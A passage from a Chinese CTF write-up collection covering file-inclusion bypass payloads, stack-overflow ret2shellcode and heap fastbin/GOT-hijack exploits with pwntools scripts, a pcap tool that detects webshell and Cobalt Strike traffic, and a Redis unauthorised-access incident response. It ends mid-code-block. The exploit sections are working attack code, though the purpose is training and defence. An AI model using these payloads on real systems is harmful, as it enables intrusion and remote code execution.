- **`php://filter` 绕过**：若过滤了 `php:` 可尝试大小写 `PHP://filter` 或 `PhP://filter`（取决于正则是否区分大小写，本题用了 `i` 修饰符）
- **`data://` 协议**：`data://text/plain,<?php system('cat /flag');?>` 可直接执行代码（需 `allow_url_include=On`）
- **`phar://` 反序列化**：上传 phar 文件后通过 `phar://upload/xxx.png` 触发反序列化，利用 POP 链 RCE
- **`.user.ini` 绕过**：上传 `.user.ini` 文件设置 `auto_prepend_file=shell.png`，使所有 PHP 文件自动包含 webshell
- **防御建议**：文件读取接口应使用白名单（允许的文件列表），而非黑名单过滤协议；`file_get_contents` 应结合 `realpath()` 检查最终路径是否在允许范围内

### 解题脚本

完整脚本：[Web/20-file-upload-llf/solve.py](Web/20-file-upload-llf/solve.py)

```python
import requests

BASE = "https://dc5195734acf8891d7bf4112.http-ctf2.dasctf.com"

# 1. 源码审计
for f in ['file.php', 'upload.php', 'class.php']:
    r = requests.get(f"{BASE}/file.php?f={f}")
    print(r.text.split('<img')[0])

# 2. 读取 flag
r = requests.get(f"{BASE}/file.php?f=/flag")
flag = r.text.split('<img')[0].strip()
print(flag)  # CTF2{1cd01c68-f86c-49aa-b4e0-7ffb38d98ae5}
```

---

## 第21题：bypwn — 栈溢出 + Ret2Shellcode（栈地址泄露）

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | PWN - 栈溢出 + Shellcode 注入 |
| 难度 | 中等 |
| 日期 | 2026-08-02 |
| 题目文件 | `bypwn`（6368字节，64位 ELF，stripped） |
| 远程地址 | `ncat --ssl 1763753f1788882586611eed.tcp-ctf2.dasctf.com 9999` |

### 二进制分析

**安全保护：**

| 保护 | 状态 | 说明 |
|------|------|------|
| RELRO | Partial | GOT 可写 |
| Stack Canary | **无** | 可直接溢出 |
| NX | **关闭** | GNU_STACK flags=XWR，栈可执行 |
| PIE | **关闭** | 地址固定 |

**关键函数（反汇编）：**

```
get_input (0x4007f9):
  sub rsp, 0x20                    // 32字节缓冲区
  memset(rbp-0x20, 0, 0x20)
  puts("well you input:")
  read(0, rbp-0x20, 0x20)         // [1] 读取32字节，无null终止
  strdup(rbp-0x20)                 // [2] 复制到堆，无null则读取栈上数据
  printf("check it, %s\n", dup)    // [3] 打印内容 → 泄露栈地址
  return dup

main (0x400863):
  sub rsp, 0x50                    // 80字节局部变量
  call get_input                   // 获取输入
  puts("EASY PWN PWN PWN~")
  scanf("%s", rbp-0x50)            // [4] 栈溢出！0x50+8=88字节到ret
  puts("bye~")
  leave; ret
```

**栈布局：**

```
get_input 栈帧:                main 栈帧:
  rbp-0x20: read buf (32B)       rbp-0x50: scanf buf (80B)
  rbp+0x00: saved rbp ← 泄露    rbp+0x00: saved rbp
  rbp+0x08: ret addr             rbp+0x08: ret addr ← 溢出目标
```

### 漏洞分析

**漏洞1：栈地址泄露（get_input）**

`read(0, buf, 0x20)` 读取恰好 32 字节，不添加 null 终止符。随后 `strdup(buf)` 会从栈缓冲区持续复制直到遇到 null 字节。如果输入 32 个非 null 字节，`strdup` 会读取到缓冲区之后的 `saved rbp`（栈地址），然后 `printf("%s")` 将其打印出来。

```
输入: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  (32个'A')
strdup读取: [32字节输入][6-8字节saved rbp][3字节ret addr遇到0x00停止]
printf输出: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA<saved_rbp_bytes>
```

**漏洞2：栈溢出（main 的 scanf）**

`scanf("%s", rbp-0x50)` 无长度限制，`%s` 读取直到空白字符。缓冲区 80 字节，saved rbp 8 字节，返回地址 8 字节。溢出偏移 = 0x50 + 8 = **88 字节**。

**scanf 坏字节限制：**

`scanf("%s")` 在以下字符处停止：`0x09`(tab) `0x0a`(newline) `0x0b`(vtab) `0x0c`(formfeed) `0x0d`(cr) `0x20`(space)

这导致关键 gadget 地址不可用：

| Gadget | 地址 | 坏字节 | 可用 |
|--------|------|--------|------|
| `pop rdi; ret` | 0x400923 | 0x09 | ❌ |
| `call rsp` | 0x4009a3 | 0x09 | ❌ |
| `ret` | 0x400611 | 无 | ✅ |
| `leave; ret` | 0x4008b2 | 无 | ✅ |
| `jmp rax` | 0x400715 | 无 | ✅ |

> **关键**：由于 `pop rdi; ret` 地址含 0x09，无法通过 scanf payload 使用 ret2libc。但 NX 关闭意味着可以直接在栈上执行 shellcode——只要能泄露栈地址。

### 攻击策略：两阶段 Ret2Shellcode

**Phase 1：泄露栈地址**

```
[get_input 阶段]
  发送: 32个非null字节 (如 'A'*32)
  read() 读入32字节到 rbp-0x20
  strdup() 读取到 saved rbp → printf 输出
  
  解析输出:
    leaked = "AAAA...AAAA" + saved_rbp_bytes
    saved_rbp = leaked[32:40]  → main 的 rbp值
    scanf_buf = saved_rbp - 0x50  → scanf 缓冲区地址
```

**Phase 2：Shellcode 注入**

```
[scanf 阶段]
  Payload = [shellcode(26B)] + [padding(62B)] + [ret_addr(8B)]
            ↑                        ↑               ↑
            scanf_buf地址          填充至88字节      p64(scanf_buf)
```

scanf 读入 payload，shellcode 存放在栈上 scanf_buf 处。当 main 返回时，跳转到 scanf_buf 执行 shellcode。

**Shellcode（execve("//bin/sh", NULL, NULL)，26字节）：**

```asm
xor rsi, rsi                      ; argv = NULL
push rsi                           ; null terminator
movabs rdi, 0x68732f6e69622f2f    ; "//bin/sh" (避免null字节)
push rdi
mov rdi, rsp                       ; rdi = ptr to string
push 59                            ; sys_execve
pop rax
xor rdx, rdx                      ; envp = NULL
syscall
```

> **技巧**：使用 `"//bin/sh"` 而非 `"/bin/sh"` 是因为 `movabs rdi, imm64` 中的立即数不能含 null 字节。`"/bin/sh\0"` 末尾有 0x00，而 `"//bin/sh"` 的 8 字节编码 `2f 2f 62 69 6e 2f 73 68` 完全无 null。

### 解题过程

```python
from pwn import *

# Phase 1: 泄露栈地址
p = remote(host, port, ssl=True)
p.recvuntil(b'well you input:\n')
p.send(b'A' * 32)                    # 32字节，无null终止
p.recvuntil(b'check it, ')
leaked = p.recvuntil(b'\n', drop=True)
saved_rbp = u64(leaked[32:40].ljust(8, b'\x00'))
scanf_buf = saved_rbp - 0x50

# Phase 2: shellcode溢出
p.recvuntil(b'EASY PWN PWN PWN~')
payload = shellcode + b'B' * (88 - len(shellcode)) + p64(scanf_buf)
p.sendline(payload)

# Phase 3: getshell
p.recvuntil(b'bye~')
p.sendline(b'cat /flag*')
# → CTF2{82c990a5-988f-4ba8-8458-f031e3df66c0}
```

**运行结果：**

```
[Phase 1] Leaking stack address...
  Saved RBP (main's rbp): 0x00007ffcc505b340
  Scanf buffer: 0x00007ffcc505b2f0
  Address is clean!

[Phase 2] Sending shellcode + overflow...
  Payload is clean! (96 bytes)
  Shellcode at: 0x00007ffcc505b2f0

[Phase 3] Getting shell...
  Got 'bye~', shellcode executing...
  CTF2{82c990a5-988f-4ba8-8458-f031e3df66c0}
```

Flag: `CTF2{82c990a5-988f-4ba8-8458-f031e3df66c0}`

### 涉及知识点

| 知识点 | 说明 |
|--------|------|
| scanf 栈溢出 | `scanf("%s")` 无长度限制，`%s` 遇空白字符停止，需注意坏字节 |
| read 无终止符泄露 | `read()` 不添加 null 终止符，`strdup`/`printf("%s")` 会读取到栈上额外数据 |
| 栈地址泄露 | 通过 `strdup` 越界读取 `saved rbp` 泄露栈地址，计算 scanf 缓冲区位置 |
| NX 关闭 + Ret2Shellcode | 栈可执行时，直接将 shellcode 写入栈并跳转执行 |
| scanf 坏字节绕过 | `0x09` 导致 `pop rdi;ret` 不可用 → 改用直接跳转 shellcode 绕过 |
| shellcode 无 null 技巧 | 使用 `"//bin/sh"` 替代 `"/bin/sh"` 避免 `movabs` 中的 null 字节 |
| GNU_STACK 权限 | `GNU_STACK` 的 `flags=XWR` 表示栈可读可写可执行 |

> **技巧**：当 `scanf("%s")` 坏字节阻止使用 `pop rdi; ret` 等关键 gadget 时，如果 NX 关闭，可以直接走 Ret2Shellcode 路线：①通过 `read`+`strdup`+`printf` 链泄露栈地址 → ②在 scanf 缓冲区放置 shellcode → ③覆盖返回地址跳到 shellcode。这比 ret2libc 更直接，不需要 libc 地址。

> **技巧**：`strdup` 是一个隐蔽的泄露原语。它从源地址持续复制直到 null 字节，如果源缓冲区没有 null 终止，就会读到栈上的 `saved rbp`（栈地址）和返回地址（代码段地址）。配合 `printf("%s")` 可以无格式化字符串漏洞就实现信息泄露。

> **技巧**：Windows 上 pwntools 的 `asm()` 需要 `binutils`，如果没有安装可以直接使用预编译的 shellcode 字节序列。用 `capstone` 或在线工具（如 shell-storm.org）编译。

### 同类变体与扩展

- **ASLR 影响**：每次运行栈地址不同，所以必须每次泄露。本题通过 Phase 1 动态泄露解决
- **scanf 坏字节变体**：如果目标地址含 0x0a（`\n`），scanf 也会停止。可以在 shellcode 中加 NOP sled 并调整跳转地址避开
- **ret2libc 备选**：如果 NX 开启，可以尝试：①利用 `jmp rax`(0x400715) 配合 puts 返回值 → ②`leave;ret` 做栈迁移到 .bss → ③在 .bss 布置 ROP 链（但 .bss 不可执行，需要 ret2libc）
- **one_gadget**：如果能泄露 libc，使用 `one_gadget` 工具找一键 RCE 地址，无需 `pop rdi`
- **防御建议**：开启 NX（`-z noexecstack`）、Canary（`-fstack-protector-all`）、PIE（`-fPIE`）、Full RELRO（`-z relro -z now`），使用 `fgets` 替代 `scanf`

### 解题脚本

完整脚本：[PWN/06-bypwn/exploit.py](PWN/06-bypwn/exploit.py)

反编译分析：[PWN/06-bypwn/decompiled.txt](PWN/06-bypwn/decompiled.txt)

---

## 第22题：easyheap — 堆溢出 + Fastbin Attack + GOT 劫持

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | PWN - 堆利用（Heap Exploitation） |
| 难度 | 中等 |
| 日期 | 2026-08-02 |
| 远程地址 | `ncat --ssl 7ce2ae89db34ba28434d328c.tcp-ctf2.dasctf.com 9999` |
| Flag | `CTF2{eeeec215-f3d6-41e3-961f-9544f77ed57c}` |

### 二进制保护

| 保护 | 状态 | 说明 |
|------|------|------|
| Canary | ✅ 开启 | 堆操作函数有栈保护 |
| NX | ✅ 开启 | 栈不可执行 |
| PIE | ❌ 关闭 | 地址固定 |
| RELRO | Partial | GOT 可写（关键！） |

### 程序结构

菜单驱动的堆管理器：

```
1. Create a Heap   — malloc(size) + read_input(heap, size)
2. Edit a Heap     — read new_size + read_input(heap, new_size)  ← 漏洞！
3. Delete a Heap   — free(heap) + heaparray[i] = NULL  ← 安全
4. Exit
```

隐藏功能：输入 `4869`（0x1305）检查 BSS 变量 `magic` > 0x1305 时调用后门 `l33t()`。

### 漏洞分析

**edit_heap 堆溢出（核心漏洞）**：

```c
void edit_heap() {
    int index = read_int("Index :");
    // 边界检查 OK
    if (heaparray[index] == NULL) { puts("No such heap!"); return; }
    int new_size = read_int("Size of Heap :");  // ← 用户可控的新 size！
    read_input(heaparray[index], new_size);      // ← 写入超过原始 malloc 大小！
}
```

> ⚠️ **关键漏洞**：`edit_heap` 允许用户重新输入 size，但写入的是**已有堆块**。如果新 size > 原 malloc size，就会溢出到相邻堆块的 metadata。

**delete_heap 安全**：free 后正确置 NULL，无 UAF。

**后门函数 l33t()**：`system("cat /home/pwn/flag")` — 但远程 flag 在 `/flag`，路径错误！

### 利用策略：Fastbin Attack → atoi@GOT → system → Shell

由于后门路径错误，不能直接触发 `l33t()`。改用 **Fastbin Attack 劫持 GOT 表** 获取 shell。

#### GOT 目标

| 函数 | PLT 地址 | GOT 地址 | 用途 |
|------|----------|----------|------|
| system | 0x400700 | 0x602038 | 替换目标值 |
| atoi | 0x400760 | 0x602068 | 被劫持的 GOT 入口 |

> **技巧**：main 循环中 `atoi(user_input)` 将用户输入转为 menu choice。如果将 `atoi@GOT` 覆写为 `system@PLT`，输入 `"/bin/sh"` 就会执行 `system("/bin/sh")`。

#### Fastbin Attack 原理（glibc 2.23，无 tcache）

1. **free chunk1 → fastbin[0x70]**：`fastbin_head → chunk1 → NULL`
2. **溢出 chunk0 → 篡改 chunk1.fd**：`fastbin_head → chunk1 → fake_chunk → NULL`
3. **malloc 两次**：第一次弹出 chunk1，第二次弹出 fake_chunk
4. fake_chunk 定位在 BSS 中，利用 `stdout` 的 libc 地址作为 fake size（0x7f）

#### Fake Chunk 构造（0x7f size 技巧）

```
BSS 布局：
  0x6020a0: stdout (libc FILE* 指针，形如 0x00007fXXXXXXXXXX)
  0x6020e0: heaparray[0..9]

stdout 的 libc 地址第 6 字节（偏移 +5）为 0x7f。
构造 fake chunk 在 0x60209d：
  0x60209d + 0x08 = 0x6020a5 → 该位置读出的 qword = 0x000000000000007f
  fastbin_index(0x7f & ~0x7) = fastbin_index(0x78) = (0x78 >> 4) - 2 = 5
  fastbin_index(0x70) = (0x70 >> 4) - 2 = 5  ← 相同！glibc 2.23 的检查通过！
```

> ⚠️ **技巧**：glibc 2.23 的 fastbin 检查是 `fastbin_index(chunksize(victim)) == idx`，而 `fastbin_index(0x78) == fastbin_index(0x70) == 5`，所以 0x7f 可以伪装成 0x70 的 fastbin chunk。这是 House of Spirit 技巧的经典应用。

#### 完整利用步骤

```
Step 1: create(0x68, 'A'*0x68)  → chunk0 @ heap+0x00 (size 0x70)
        create(0x68, 'B'*0x68)  → chunk1 @ heap+0x70 (size 0x70)
        create(0x18, 'C'*0x18)  → chunk2 @ heap+0xe0 (guard)

Step 2: free(1) → fastbin[0x70]: chunk1 → NULL

Step 3: edit(0, 0x78, payload)
        payload = 'A'*0x60        ← chunk0 数据
                + p64(0)           ← chunk1 prev_size
                + p64(0x71)        ← chunk1 size（保持不变）
                + p64(0x60209d)    ← chunk1.fd → fake BSS chunk

Step 4: create(0x68, 'D') → 弹出 chunk1
        fastbin[0x70]: fake_chunk(0x60209d) → NULL

Step 5: create(0x68, fake_data) → 弹出 fake_chunk，返回 0x6020ad
        fake_data = '\x00'*0x33          ← 填充到 heaparray[0]
                  + p64(0x602068)         ← heaparray[0] = atoi@GOT

        现在 heaparray[0] 指向 atoi@GOT！

Step 6: edit(0, 8, p64(0x400700))
        → write(atoi@GOT, system@PLT)
        → atoi 现在是 system！

Step 7: sendline("/bin/sh")  → atoi("/bin/sh") → system("/bin/sh") → SHELL!

Step 8: cat /flag → CTF2{eeeec215-f3d6-41e3-961f-9544f77ed57c}
```

### 备选方案：Unsorted Bin Attack（验证后门但 flag 路径错误）

另一种利用方式是 **Unsorted Bin Attack** 写入 `magic` 变量：

1. create(0x18) + create(0x80) + create(0x10 guard)
2. free(1) → unsorted bin（chunk_size 0x90 > fastbin 范围）
3. edit(0, 0x30) 溢出 → 设置 chunk1.bk = 0x6020b0（magic - 0x10）
4. create(0x80) → 精确匹配 → `bck->fd = unsorted_chunks(av)` 写入 magic
5. 输入 4869 → magic > 0x1305 → l33t() → `system("cat /home/pwn/flag")`

> ⚠️ **陷阱**：此方案成功触发后门（输出 "Congrt !"），但 `system("cat /home/pwn/flag")` 报告 "No such file or directory"——flag 实际在 `/flag`，不在 `/home/pwn/flag`。这是出题人的"坑"，需要获取 shell 才能找到正确路径。

### 远程 glibc 版本判断

- 远程 glibc 2.23（无 tcache）：Unsorted Bin Attack 和 Fastbin Attack 均可用
- WSL glibc 2.31（有 tcache）：Tcache Poisoning 方案可用（本地验证），但 Unsorted Bin Attack 失败（有 "unsorted double linked list corrupted" 检查）

### 关键知识点

1. **Fastbin Attack**：通过溢出篡改 freed chunk 的 fd 指针，使 malloc 返回任意地址
2. **0x7f fake size 技巧**：利用 libc 地址的高位 0x7f 字节作为 fake chunk size，绕过 glibc 2.23 的 fastbin index 检查
3. **GOT 劫持**：Partial RELRO 下 GOT 可写，覆写 `atoi@GOT` 为 `system@PLT` 实现任意命令执行
4. **Unsorted Bin Attack**：篡改 freed chunk 的 bk 指针，在 malloc 时触发 `bck->fd = unsorted_chunks(av)`，向目标地址写入 libc 地址
5. **House of Spirit**：在目标区域构造 fake chunk，通过 fastbin 返回该区域地址

### 同类变体与扩展

- **tcache 版本（glibc 2.27+）**：不需要 fake size，直接覆写 tcache next 指针即可。注意 glibc 2.32+ 有 safe-linking 保护（next 指针异或加密）
- **无 system@plt**：如果没有 system 的 PLT，可通过 unsorted bin leak libc → 计算 system 真实地址 → 覆写 `__free_hook` 或 `__malloc_hook`
- **Full RELRO**：如果 GOT 不可写，改用 `__free_hook` / `__malloc_hook` 覆写
- **防御建议**：开启 Full RELRO（`-z relro -z now`）、使用 tcache safe-linking、对 edit 操作进行 size 校验

### 解题脚本

完整脚本：[PWN/07-easyheap/exploit.py](PWN/07-easyheap/exploit.py)

反编译分析：[PWN/07-easyheap/decompiled.txt](PWN/07-easyheap/decompiled.txt)

---

## 第23题：PCAP Arcanum - 自动化流量取证分析工具

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | IR - 流量取证工具开发 |
| 难度 | 进阶 |
| 日期 | 2026-08-02 |
| 工具路径 | [IR/19-pcap-arcanum/pcap_arcanum.py](IR/19-pcap-arcanum/pcap_arcanum.py) |

### 背景

在 CTF 应急响应题中，经常需要分析 pcap/pcapng 流量包，识别攻击者使用的 Webshell 管理工具（蚁剑、冰蝎、哥斯拉、中国菜刀）或 C2 框架（Cobalt Strike），解码加密通信载荷，提取 flag 和攻击时间线。

传统方法需要手动用 Wireshark 逐包分析，耗时耗力。本题开发了一款自动化流量取证分析工具 **PCAP Arcanum**，一键识别攻击工具、解码加密载荷、提取 flag。

### 工具架构

```
PCAP Arcanum
├── TCPStreamReassembler    # TCP流重组引擎 (按seq排序拼接，提取HTTP请求/响应对)
├── AntSwordDetector        # 蚁剑检测器 (URL编码+Base64+特征PHP函数)
├── BehinderDetector        # 冰蝎检测器 (AES-ECB解密, key=e45e329feb5d925b)
├── GodzillaDetector        # 哥斯拉检测器 (AES-ECB解密, key=3c6e0b8a9c15224a, Java UA)
├── ChopperDetector         # 中国菜刀检测器 (eval/assert+Base64)
├── CobaltStrikeDetector    # Cobalt Strike检测器 (checksum8 URI+心跳包+PE stager)
├── FileTransferDetector    # 文件传输检测器 (ZIP/PNG/JPEG/ELF/PE文件签名)
├── GenericShellDetector    # 通用Shell命令检测器 (whoami/id/cat等明文命令)
└── PCAPArcanum             # 主分析引擎 (运行所有检测器+生成报告)
```

### 支持检测的攻击工具

| 工具 | 检测特征 | 解密方式 | 默认密钥 |
|------|----------|----------|----------|
| 蚁剑 (AntSword) | `@ini_set("display_errors","0")` + `@eval(@base64_decode($_POST[...]))` | URL解码 + Base64解码 | 无需密钥 |
| 冰蝎 (Behinder) v3 | Content-Type: application/octet-stream + body 16字节对齐 | AES-ECB | `e45e329feb5d925b` (MD5("rebeyond")[:16]) |
| 哥斯拉 (Godzilla) | Java UA + `pass=` 参数 + 响应前16/后16字节标记 | AES-ECB + Base64 | `3c6e0b8a9c15224a` (MD5("key")[:16]) |
| 中国菜刀 (Chopper) | `eval(base64_decode($_POST[...]))` / `assert($_POST[...])` | Base64解码 | 无需密钥 |
| Cobalt Strike | checksum8 URI (sum%256=92/93) + 周期心跳包 + PE stager响应 | 无解密 | 无需密钥 |

### 实战测试

#### 测试用例：SimpleFlow.pcapng（第18题蚁剑流量）

```bash
py -3 pcap_arcanum.py SimpleFlow.pcapng --verbose --export-dir ./output
```

**测试结果**：

```
数据包总数: 417
HTTP请求对数: 13

检测器结果:
  蚁剑 (AntSword)    ✓ 检测到  置信度: 100%  事件数: 10
  哥斯拉 (Godzilla)   ✗ 未检测到
  冰蝎 (Behinder)    ✗ 未检测到
  中国菜刀 (Chopper)   ✗ 未检测到
  Cobalt Strike    ✗ 未检测到  置信度: 25%
  文件传输           ✓ 检测到  置信度: 100%  事件数: 2
  通用Shell命令      ✗ 未检测到
```

**自动提取的攻击时间线**：

1. 蚁剑连接 → 查看系统信息 (uname, ifconfig)
2. 列目录 → 浏览 `/Users/chang/Sites/test/`
3. 尝试读取 flag → `head -n ../flag.txt`（参数错误，失败）
4. 成功读取 flag → `head -n 2 ../flag.txt`（响应："Yes,this is the flag file."）
5. 打包 flag → `zip -P PaSsZiPWorD flag.zip ../flag.txt`（**ZIP密码提取成功**）
6. 下载 flag.zip → 文件传输检测器识别 ZIP 签名

**自动提取结果**：

- ZIP密码: `PaSsZiPWorD`（从 `zip -P` 命令参数中提取）
- ZIP解压: 自动用提取的密码解压 `flag.zip`
- Flag: `DASCTF{f3f32f434eddbc6e6b5043373af95ae8}`

### 核心技术点

#### 1. TCP 流重组

```python
class TCPStreamReassembler:
    # 按4元组(src_ip, src_port, dst_ip, dst_port)分组
    # 每个流按方向(req/resp)收集TCP payload
    # 按seq排序后拼接，提取HTTP请求/响应对
    # 支持 chunked 编码解码 + gzip 解压
```

> **技巧**：TCP流重组是流量分析的基础。同一个HTTP请求可能被分到多个TCP包中，必须按seq号排序拼接才能获得完整数据。注意处理重传包（相同seq的包只保留一次）。

#### 2. 蚁剑流量解码

蚁剑的POST参数格式：`随机hex参数名=编码内容`

编码方式：参数值前2字符是编码标记（如 `cd`），剩余部分是 Base64 编码的 shell 命令。

```python
# 蚁剑响应格式: 前12位hex + 实际内容 + 后12位hex
resp_content = resp_str[12:-12]
```

> **技巧**：蚁剑的参数名是随机生成的 hex 字符串（8位以上），参数值去掉前2字符后 Base64 解码即为 shell 命令。响应内容的首尾各有12位 hex 标记，需要去掉。

#### 3. 冰蝎 AES-ECB 解密

```python
# 冰蝎 v3 默认密钥 = MD5("rebeyond")[:16]
key = b'e45e329feb5d925b'
cipher = AES.new(key, AES.MODE_ECB)
decrypted = unpad(cipher.decrypt(body), AES.block_size)
```

识别特征：
- Content-Type: `application/octet-stream`
- 请求/响应 body 大小是 16 的倍数（AES块对齐）
- 请求路径是 webshell 文件（如 `shell.php`）

> **技巧**：冰蝎 v3 去除了动态密钥协商，使用固定密钥。如果默认密钥解密失败，可能使用了自定义密钥，需要找密钥协商阶段的握手包（v2 在第一次请求返回16字节密钥）。

#### 4. 哥斯拉 AES-ECB + Base64 双重编码

```python
# 哥斯拉默认密钥 = MD5("key")[:16]
key = b'3c6e0b8a9c15224a'

# 请求: pass=base64(AES_ECB_encrypt(payload))
encrypted = AES.new(key, AES.MODE_ECB).encrypt(pad(payload))
b64_encoded = base64.b64encode(encrypted).decode()
body = f"pass={b64_encoded}"

# 响应: 前16字节 + base64(AES_ECB_encrypt(result)) + 后16字节
stripped = response_body[16:-16]
decoded = base64.b64decode(stripped)
decrypted = AES.new(key, AES.MODE_ECB).decrypt(decoded)
```

识别特征：
- User-Agent 包含 `Java/`（哥斯拉基于 Java）
- POST 参数名是 `pass`（默认密码参数名）
- 响应体前16和后16字节是标记字符，中间是 Base64 编码的 AES 加密数据

> **技巧**：哥斯拉的请求和响应都使用 AES-ECB + Base64 双重编码。响应格式是 `前缀(16字节) + Base64(AES加密数据) + 后缀(16字节)`，需要先去掉前后缀，再 Base64 解码，最后 AES 解密。

#### 5. Cobalt Strike checksum8 算法

```python
def _checksum8(text):
    """CS checksum8: 所有ASCII字符的和 mod 256"""
    return sum(ord(c) for c in text) % 256

# 32位 stager URI: checksum8 = 92
# 64位 stager URI: checksum8 = 93
```

CS Beacon 特征：
- Stager 请求 URI 的 checksum8 值为 92（32位）或 93（64位）
- Stager 响应返回 PE 文件（MZ 头）
- Beacon 定期发送心跳请求（间隔通常 30-120s）
- 默认 User-Agent: `Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)`

> **技巧**：CS 的 stager URI 是经过设计的——所有字符的 ASCII 和 mod 256 必须等于 92（32位）或 93（64位）。这个特征是 CS 内置的，无法更改。可以用这个特征快速筛选 CS 流量。

#### 6. ZIP 密码自动提取

```python
# 从蚁剑/菜刀命令中提取 zip -P 参数
for cmd in commands:
    m = re.search(r'zip\s+-P\s+(\S+)', cmd)
    if m:
        zip_password = m.group(1)
```

> **技巧**：CTF 中常见的套路是攻击者用 `zip -P 密码 flag.zip flag.txt` 打包 flag，然后通过蚁剑/菜刀下载。从命令参数中提取 `-P` 后面的密码，再用这个密码解压下载的 ZIP 文件，就能自动获取 flag。

### 使用方法

```bash
# 基本用法
python pcap_arcanum.py traffic.pcapng

# 详细模式（显示每个HTTP请求的摘要）
python pcap_arcanum.py traffic.pcapng --verbose

# 导出报告和提取的文件
python pcap_arcanum.py traffic.pcapng --export-dir ./output

# 输出:
#   - 控制台打印完整分析报告
#   - output/analysis_report.txt  (文本报告)
#   - output/analysis_data.json   (JSON格式数据)
#   - output/extracted_1.zip      (提取的ZIP文件)
```

### 依赖

```
scapy          # pcap文件读取 + TCP包解析
pycryptodome   # AES-ECB解密 (冰蝎/哥斯拉)
```

### 关键知识点

1. **Webshell 管理工具流量特征**：每种工具都有独特的流量指纹（UA、Content-Type、参数格式、编码方式），可以用于快速识别
2. **AES-ECB 模式**：冰蝎和哥斯拉都使用 AES-ECB 加密通信，ECB 模式不需要 IV，但相同的明文块加密后密文相同（安全性较低）
3. **密钥派生**：冰蝎 key = MD5("rebeyond")[:16]，哥斯拉 key = MD5("key")[:16]，都是对固定字符串取 MD5 前16位
4. **TCP 流重组**：HTTP 流量分析的基础，必须将分散在多个 TCP 包中的数据按 seq 号排序拼接
5. **Cobalt Strike checksum8**：CS stager URI 的校验算法，是 CS 流量的硬编码特征，无法更改

### 同类变体与扩展

- **冰蝎 v4 动态密钥**：v4 版本恢复了密钥协商机制，需要先找到握手包提取密钥
- **哥斯拉自定义密码**：如果默认密码 `key` 被修改，需要从 webshell 源码中提取自定义密钥
- **CS HTTPS 信道**：如果 CS 使用 HTTPS，需要先解密 TLS 流量（需要私钥或 SSLKEYLOGFILE）
- **混合流量**：一个 pcap 中可能包含多种工具的流量，工具支持多检测器并行运行

> ⚠️ **注意**：冰蝎 v4 和哥斯拉自定义密钥场景下，默认密钥解密会失败。工具会输出提示信息，需要人工分析密钥协商阶段获取实际密钥。

### 解题脚本

完整工具：[IR/19-pcap-arcanum/pcap_arcanum.py](IR/19-pcap-arcanum/pcap_arcanum.py)

测试输出：[IR/19-pcap-arcanum/test_output/](IR/19-pcap-arcanum/test_output/)

> AI生成

---

## 第24题：Redis 未授权访问应急响应

### 题目信息

| 项目 | 内容 |
|------|------|
| 题目类型 | IR - 应急响应（实机排查） |
| 难度 | 中等 |
| 日期 | 2026-08-02 |
| 靶机IP | 192.168.234.128 |
| 连接方式 | SSH `defend@192.168.234.128`，密码 `defend` |
| 目标 | 找出攻击者IP + 3个flag |

### 答案

| 项目 | 答案 |
|------|------|
| 攻击者IP | `192.168.75.129` |
| Flag 1 | `flag{thisismybaby}` — 来源：`/root/.bash_history` |
| Flag 2 | `flag{kfcvme50}` — 来源：`/etc/rc.d/rc.local` |
| Flag 3 | `flag{P@ssW0rd_redis}` — 来源：`/etc/redis.conf` 首行注释 |

### 攻击时间线

以下是通过对靶机多种日志源的交叉对比还原出的完整攻击链：

```
3月18日
├── 19:17-19:18  defend 用 sudo yum makecache 配置镜像源
├── 19:19        defend 安装 Redis（yum install redis -y）
├── 19:20:15     Redis 首次启动（systemctl start redis）
├── 19:21:09     defend 用 sudo vim 编辑 /etc/redis.conf（第一次修改）
│                → 修改内容：bind 0.0.0.0、protected-mode no（允许远程连接）
├── 19:23:02     Redis 重启（systemctl restart redis）
├── 19:24:38     defend 关闭防火墙（systemctl stop/disable firewalld）
├── 19:26-19:27  defend 再次编辑 redis.conf（第二次修改）+ 重启Redis
├── 19:27:57     ★ 攻击者 192.168.75.129 首次连接 Redis（端口6379）
│                → 写入 SSH 公钥到 Redis 数据库（key 名为空字符串或 TJB=）
│                → CONFIG SET dir /var/lib/redis
│                → CONFIG SET dbfilename dump.rdb
│                → BGSAVE 保存 RDB 快照
├── 19:29:18-51  ★ 攻击者 SSH 暴力破解 root 密码（多线程并发）
│                → 使用 hydra/medusa 等工具，15个并发连接
│                → 全部失败，超过最大认证次数被断开
├── 19:39:31     攻击者再次连接 Redis，查询/写入数据
├── 19:44:53     defend 关闭 Redis
├── 19:45:55     defend 重新启动 Redis（DB 0: 1 keys → SSH公钥已持久化）
├── 20:15:05     defend 用 su 切换到 root（获取root权限）
├── 20:20:32     root 手动运行 redis-server /etc/redis.conf（3次）
├── 20:23:07     ★ 攻击者 SSH 免密登录 root 成功！
│                → Accepted publickey for root from 192.168.75.129
│                → 使用之前 Redis 写入的 SSH 公钥免密登录
├── 20:23-20:25  攻击者 root 会话期间执行：
│                → chmod +x /etc/rc.d/rc.local
│                → vim /etc/rc.d/rc.local（写入 flag{kfcvme50}）
│                → echo flag{thisismybaby}
│                → exit
├── 20:25:08     攻击者断开SSH
├── 3月19日 03:14 系统重启
```

### 攻击手法分析

#### 1. Redis 未授权访问 → SSH 公钥写入

攻击者利用 Redis 3.2.12 的未授权访问漏洞（`bind 0.0.0.0` + `protected-mode no`），通过以下步骤实现 SSH 公钥写入：

```bash
# 攻击者在 Kali 上执行的等效操作
ssh-keygen -t rsa -b 3072 -C "chinaran@kali"

# 通过 Redis 协议写入公钥
redis-cli -h 192.168.234.128
> CONFIG SET dir /var/lib/redis
> CONFIG SET dbfilename dump.rdb
> SET x "\n\nssh-rsa AAAA...公钥内容... chinaran@kali\n\n"
> SAVE

# 或者使用 redis-dump 工具直接生成 RDB 文件
```

RDB 文件中的公钥内容（`/var/lib/redis/dump.rdb`，661字节）：
```
